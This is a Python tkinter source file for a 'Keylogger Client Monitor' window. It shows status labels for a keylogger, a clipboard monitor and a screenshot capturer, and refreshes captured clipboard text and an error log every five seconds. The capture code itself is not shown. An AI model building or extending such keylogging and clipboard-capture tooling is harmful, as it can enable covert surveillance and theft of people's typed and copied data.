import tkinter as tk
from clipboard_monitor import latest_clipboard  # Updated import
import os

class ClientGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Client Monitor")
        self.root.geometry("600x400")

        tk.Label(root, text="Keylogger Status: Running", fg="green").pack(pady=5)
        tk.Label(root, text="Clipboard Monitor: Running", fg="green").pack(pady=5)
        tk.Label(root, text="Screenshot Capture: Running", fg="green").pack(pady=5)

        tk.Label(root, text="Recent Clipboard:").pack(pady=5)
        self.clipboard_text = tk.Text(root, height=3, width=50)
        self.clipboard_text.pack(pady=5)

        tk.Label(root, text="Error Log:").pack(pady=5)
        self.error_text = tk.Text(root, height=5, width=50)
        self.error_text.pack(pady=5)

        self.update_gui()

    def update_gui(self):
        self.clipboard_text.delete(1.0, tk.END)
        self.clipboard_text.insert(tk.END, latest_clipboard[:100] or "Empty")  # Limit to 100 chars
        if os.path.exists("error_log.txt"):
            with open("error_log.txt", "r") as f:
                errors = f.read()
            self.error_text.delete(1.0, tk.END)
            self.error_text.insert(tk.END, errors[-200:])  # Last 200 chars
        self.root.after(5000, self.update_gui)

def start_gui():
    root = tk.Tk()
    app = ClientGUI(root)
    root.mainloop()

if __name__ == "__main__":
    start_gui()